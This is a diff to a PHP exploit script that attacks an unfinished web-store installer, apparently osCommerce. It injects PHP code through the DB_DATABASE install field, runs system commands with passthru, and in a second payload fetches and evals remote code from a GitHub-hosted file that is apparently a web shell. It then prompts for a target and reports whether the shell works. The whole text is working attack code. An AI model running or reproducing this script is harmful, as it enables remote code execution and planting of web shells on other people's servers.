@@ -20,7 +20,7 @@ function request($url, $postdata = null) {
 }
 
 $data = ["DIR_FS_DOCUMENT_ROOT" => "./"];
-$payload = "');passthru(\"ls\");/*";
+$payload = "');passthru(\"id\");/*";
 $payload2 = "');eval(\"?>\".file_get_contents(\"https://raw.githubusercontent.com/nastar-id/kegabutan/master/nastar.php\"));/*";
 
 echo "[!] Enter target => ";
@@ -35,7 +35,7 @@ if($install["head"] == 200 && preg_match("/Installation/", $install["body"])) {
 	$data["DB_DATABASE"] = $payload;
 	$inject = request($target, $data);
 	$shelk = request($shell);
-	if($shelk["head"] == 200 && preg_match("/uid/", $shelk["body"])) {
+	if($shelk["head"] == 200 && preg_match("/gid/", $shelk["body"])) {
 		echo "[+] Shell success!\n";
 		echo "[+] ".$shell."\n\n";
 	} elseif($shelk["head"] == 200 && preg_match("/disabled/", $shelk["body"])) {
